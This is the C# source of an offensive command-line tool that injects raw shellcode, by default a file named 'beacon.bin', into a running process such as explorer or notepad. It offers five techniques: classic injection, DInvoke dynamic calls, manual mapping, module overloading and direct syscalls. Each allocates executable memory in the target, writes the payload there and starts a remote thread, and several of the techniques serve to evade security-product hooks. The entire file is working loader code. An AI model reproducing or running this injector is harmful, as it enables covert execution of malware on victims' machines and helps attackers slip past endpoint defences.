using System;
using System.Diagnostics;
using System.IO;
using System.Linq.Expressions;
using System.Runtime.InteropServices;
using DInvoke.Data;
using static ShellcodeInjection.Imports.Imports;

namespace ShellcodeInjection
{
    class Program
    {
        public static byte[] buf = new byte[] { };
        public static bool fileexistflag = false;
        
        static void classic(string processName)
        {
            Process[] expProc = Process.GetProcessesByName(processName);
            int processId = expProc[0].Id;
            var desiredAccess = ProcessAccess.PROCESS_CREATE_THREAD | ProcessAccess.PROCESS_QUERY_INFORMATION | ProcessAccess.PROCESS_VM_OPERATION | ProcessAccess.PROCESS_VM_READ | ProcessAccess.PROCESS_VM_WRITE;
            
            IntPtr ptr = IntPtr.Zero;
            ptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
            OpenProcessD OpenProcess = (OpenProcessD)Marshal.GetDelegateForFunctionPointer(ptr, typeof(OpenProcessD));
            IntPtr procHandle = OpenProcess((uint)desiredAccess, false, (uint)processId);
            if (procHandle != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Got a handle to process. Handle ID: {procHandle}");
            }
            else
            {
                Console.WriteLine($"[-] Error opening a handle to the process.");
            }

            int shellcode_size = buf.Length;
            int bytesWritten = 0;
            IntPtr lpthreadIP = IntPtr.Zero;

            ptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            VirtualAllocExD VirtualAllocEx =
                (VirtualAllocExD)Marshal.GetDelegateForFunctionPointer(ptr, typeof(VirtualAllocExD));
            IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
            if (init != IntPtr.Zero)
            {
                Console.WriteLine("[*] Allocated Memory. {0}", init.ToString("X"));
            }
            else
            {
                Console.WriteLine($"[-] Error allocating memory.");
            }

            ptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            WriteProcessMemoryD WriteProcessMemory = (WriteProcessMemoryD)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WriteProcessMemoryD));
            bool success = WriteProcessMemory(procHandle, init, buf, shellcode_size, ref bytesWritten);
            if (success != false)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. {success}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }

            ptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            CreateRemoteThreadD CreateRemoteThread = (CreateRemoteThreadD)Marshal.GetDelegateForFunctionPointer(ptr, typeof(CreateRemoteThreadD));
            IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, lpthreadIP);
            if (threadPTR != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Resuming thread. {threadPTR}");
            }
            else
            {
                Console.WriteLine($"[-] Error resuming thread.");
            }
        }

        static void dynamicinvoke(string processName)
        {
            Process[] expProc = Process.GetProcessesByName(processName);
            int processId = expProc[0].Id;
            var desiredAccess = ProcessAccess.PROCESS_CREATE_THREAD | ProcessAccess.PROCESS_QUERY_INFORMATION | ProcessAccess.PROCESS_VM_OPERATION | ProcessAccess.PROCESS_VM_READ | ProcessAccess.PROCESS_VM_WRITE;
            
            IntPtr ptr = IntPtr.Zero;
            object[] OpenProcessArgs = { (uint)desiredAccess, false, (uint)processId };
            IntPtr procHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(OpenProcessD), ref OpenProcessArgs);
            if (procHandle != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Got a handle to process. Handle ID: {procHandle}");
            }
            else
            {
                Console.WriteLine($"[-] Error opening a handle to the process.");
            }

            int shellcode_size = buf.Length;
            int bytesWritten = 0;
            IntPtr lpthreadIP = IntPtr.Zero;

            object[] VirtualAllocExArgs = { procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE };
            IntPtr init = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "VirtualAllocEx", typeof(VirtualAllocExD), ref VirtualAllocExArgs);
            if (init != IntPtr.Zero)
            {
                Console.WriteLine("[*] Allocated Memory. {0}", init.ToString("X"));
            }
            else
            {
                Console.WriteLine($"[-] Error allocating memory.");
            }

            object[] WriteProcessMemoryArgs = { procHandle, init, buf, shellcode_size, bytesWritten };
            bool success = (bool)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "WriteProcessMemory", typeof(WriteProcessMemoryD), ref WriteProcessMemoryArgs);
            if (success != false)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. {success}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }

            //object[] CreateRemoteThreadArgs = { procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, lpthreadIP };
            //IntPtr threadPTR = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CreateRemoteThread", typeof(CreateRemoteThreadD), ref CreateRemoteThreadArgs);
            // Using the DInvoke way cause the upper one returns an error. TODO: Fix this.
            IntPtr threadPTR = DInvoke.DynamicInvoke.Win32.CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadIP);
            if (threadPTR != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Resuming thread. {threadPTR}");
            }
            else
            {
                Console.WriteLine($"[-] Error resuming thread.");
            }
        }

        static void manualmap(string processName)
        {
            Process[] expProc = Process.GetProcessesByName(processName);
            int processId = expProc[0].Id;
            var desiredAccess = ProcessAccess.PROCESS_CREATE_THREAD | ProcessAccess.PROCESS_QUERY_INFORMATION | ProcessAccess.PROCESS_VM_OPERATION | ProcessAccess.PROCESS_VM_READ | ProcessAccess.PROCESS_VM_WRITE;
            
            PE.PE_MANUAL_MAP mappedDLL = new PE.PE_MANUAL_MAP();
            mappedDLL = DInvoke.ManualMap.Map.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");

            IntPtr ptr = IntPtr.Zero;
            object[] OpenProcessArgs = { (uint)desiredAccess, false, (uint)processId };
            IntPtr procHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "OpenProcess", typeof(OpenProcessD), OpenProcessArgs, false);
            if (procHandle != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Got a handle to process. Handle ID: {procHandle}");
            }
            else
            {
                Console.WriteLine($"[-] Error opening a handle to the process.");
            }

            int shellcode_size = buf.Length;
            int bytesWritten = 0;
            IntPtr lpthreadIP = IntPtr.Zero;

            object[] VirtualAllocExArgs = { procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE };
            IntPtr init = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "VirtualAllocEx", typeof(VirtualAllocExD), VirtualAllocExArgs, false);
            if (init != IntPtr.Zero)
            {
                Console.WriteLine("[*] Allocated Memory. {0}", init.ToString("X"));
            }
            else
            {
                Console.WriteLine($"[-] Error allocating memory.");
            }

            object[] WriteProcessMemoryArgs = { procHandle, init, buf, shellcode_size, bytesWritten };
            bool success = (bool)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "WriteProcessMemory", typeof(WriteProcessMemoryD), WriteProcessMemoryArgs, false);
            if (success != false)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. {success}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }

            //object[] CreateRemoteThreadArgs = { procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, lpthreadIP };
            //IntPtr threadPTR = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "CreateRemoteThread", typeof(CreateRemoteThreadD), CreateRemoteThreadArgs, false);
            IntPtr threadPTR = DInvoke.DynamicInvoke.Win32.CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadIP);
            if (threadPTR != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Resuming thread. {threadPTR}");
            }
            else
            {
                Console.WriteLine($"[-] Error resuming thread.");
            }
        }

        static void overload(string processName)
        {
            Process[] expProc = Process.GetProcessesByName(processName);
            int processId = expProc[0].Id;
            var desiredAccess = ProcessAccess.PROCESS_CREATE_THREAD | ProcessAccess.PROCESS_QUERY_INFORMATION | ProcessAccess.PROCESS_VM_OPERATION | ProcessAccess.PROCESS_VM_READ | ProcessAccess.PROCESS_VM_WRITE;
            
            PE.PE_MANUAL_MAP mappedDLL = new PE.PE_MANUAL_MAP();
            mappedDLL = DInvoke.ManualMap.Overload.OverloadModule(@"C:\Windows\System32\kernel32.dll");

            IntPtr ptr = IntPtr.Zero;
            object[] OpenProcessArgs = { (uint)desiredAccess, false, (uint)processId };
            IntPtr procHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "OpenProcess", typeof(OpenProcessD), OpenProcessArgs, false);
            if (procHandle != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Got a handle to process. Handle ID: {procHandle}");
            }
            else
            {
                Console.WriteLine($"[-] Error opening a handle to the process.");
            }

            int shellcode_size = buf.Length;
            int bytesWritten = 0;
            IntPtr lpthreadIP = IntPtr.Zero;

            object[] VirtualAllocExArgs = { procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE };
            IntPtr init = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "VirtualAllocEx", typeof(VirtualAllocExD), VirtualAllocExArgs, false);
            if (init != IntPtr.Zero)
            {
                Console.WriteLine("[*] Allocated Memory. {0}", init.ToString("X"));
            }
            else
            {
                Console.WriteLine($"[-] Error allocating memory.");
            }

            object[] WriteProcessMemoryArgs = { procHandle, init, buf, shellcode_size, bytesWritten };
            bool success = (bool)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "WriteProcessMemory", typeof(WriteProcessMemoryD), WriteProcessMemoryArgs, false);
            if (success != false)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. {success}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }

            //object[] CreateRemoteThreadArgs = { procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, lpthreadIP };
            //IntPtr threadPTR = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "CreateRemoteThread", typeof(CreateRemoteThreadD), CreateRemoteThreadArgs, false);
            IntPtr threadPTR = DInvoke.DynamicInvoke.Win32.CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadIP);
            if (threadPTR != IntPtr.Zero)
            {
                Console.WriteLine($"[*] Resuming thread. {threadPTR}");
            }
            else
            {
                Console.WriteLine($"[-] Error resuming thread.");
            }
        }

        //static void syscalls(int processId)
        static void syscalls(string processName)
        {
            Process[] expProc = Process.GetProcessesByName(processName);
            int processId = expProc[0].Id;
            var desiredAccess = ProcessAccess.PROCESS_CREATE_THREAD | ProcessAccess.PROCESS_QUERY_INFORMATION | ProcessAccess.PROCESS_VM_OPERATION | ProcessAccess.PROCESS_VM_READ | ProcessAccess.PROCESS_VM_WRITE;
            
            IntPtr syscall = IntPtr.Zero;
            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtOpenProcess");
            NtOpenProcess NtOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtOpenProcess));
            var oa = new Native.OBJECT_ATTRIBUTES();
            var cid = new Native.CLIENT_ID
            {
                UniqueProcess = (IntPtr)processId
            };
            var procHandle = IntPtr.Zero;
            Native.NTSTATUS status = NtOpenProcess(ref procHandle,
                desiredAccess,
                ref oa,
                ref cid);

            if (status == Native.NTSTATUS.Success)
            {
                Console.WriteLine($"[*] Got a handle to process. Handle ID: {procHandle}");
            }
            else
            {
                Console.WriteLine($"[-] Error opening a handle to the process.");
            }

            IntPtr shellcode_size = (IntPtr)buf.Length;
            IntPtr init = IntPtr.Zero;
            uint bytesWritten = 0;
            IntPtr lpthreadIP = IntPtr.Zero;
            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory NtAllocateVirtualMemory = (NtAllocateVirtualMemory) Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtAllocateVirtualMemory));
            status = NtAllocateVirtualMemory(procHandle, ref init, IntPtr.Zero, ref shellcode_size, State.MEM_COMMIT | State.MEM_RESERVE, Protection.PAGE_EXECUTE_READWRITE);

            if (status == Native.NTSTATUS.Success)
            {
                Console.WriteLine("[*] Allocated Memory. {0}", init.ToString("X"));
            }
            else
            {
                Console.WriteLine($"[-] Error allocating memory.");
            }

            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            NtWriteVirtualMemory NtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtWriteVirtualMemory));
            var data = Marshal.AllocHGlobal(buf.Length);
            Marshal.Copy(buf, 0, data, buf.Length);
            status = NtWriteVirtualMemory(procHandle, init, data, (uint)shellcode_size, ref bytesWritten);

            if (status == Native.NTSTATUS.Success)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. Bytes written: {bytesWritten}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }

            syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
            NtCreateThreadEx NtCreateThreadEx = (NtCreateThreadEx) Marshal.GetDelegateForFunctionPointer(syscall, typeof(NtCreateThreadEx));
            IntPtr hThread = IntPtr.Zero;
            status = NtCreateThreadEx(out hThread, Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, procHandle, init, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (status == Native.NTSTATUS.Success)
            {
                Console.WriteLine($"[*] Wrote shellcode into the memory. {hThread}");
            }
            else
            {
                Console.WriteLine($"[-] Error writing shellcode.");
            }
        }

        static void banner()
        {
            Console.WriteLine("[*] Shellcode Injection techniques using DInvoke.");
            usage();
        }

        static void usage()
        {
            Console.WriteLine("[*] Usage: shellcodeinjection.exe <method> <Process Name> -f <rawfile path>");
            Console.WriteLine("[*] Method: -c: classic -d: dynamicinvoke -m: manualmap -o: overload -s: syscalls");
            Console.WriteLine("[*] Example 1: shellcodeinjection.exe -s notepad -f beacon.bin");
            Console.WriteLine("[*] Example 2: shellcodeinjection.exe -d notepad -f 'C:\\temp\\beacon.bin'");
        }

        public static void readbyte(string rawfile)
        {
            byte[] sc = new byte[] { };
            if (File.Exists(rawfile))
            {   
                sc = System.IO.File.ReadAllBytes(rawfile);
                buf = sc;
                Console.WriteLine("File name: " + rawfile);
                fileexistflag = true;
            }
            else
            {
                Console.WriteLine();
                Console.WriteLine("[*] Error!");
                Console.WriteLine("[*] Rawfile not exist! Please check the file path or name is correct. ");
                Console.WriteLine();
                Environment.Exit(0);
            }
        }

        public static void Main(string[] args)
        {
            banner();

            if (args.Length < 3)
                readbyte("beacon.bin");
            else 
                readbyte(args[3]);
            
            Console.WriteLine("Shellcode Length: " + buf.Length);

            if (args.Length == 0 && fileexistflag)
                syscalls("explorer");
            else if (fileexistflag)
            {
                switch (args[0])
                {
                    case "-c":
                        classic(args[1]);
                        break;
                    case "-d":
                        dynamicinvoke(args[1]);
                        break;
                    case "-m":
                        manualmap(args[1]);
                        break;
                    case "-o":
                        overload(args[1]);
                        break;
                    case "-s":
                        syscalls(args[1]);
                        break;
                }
            } 
            else 
            {
                Console.WriteLine();
                Console.WriteLine("[*] Error!");
                Console.WriteLine("Please check the usage again.");
                Console.WriteLine();
            }
        }
    }
}
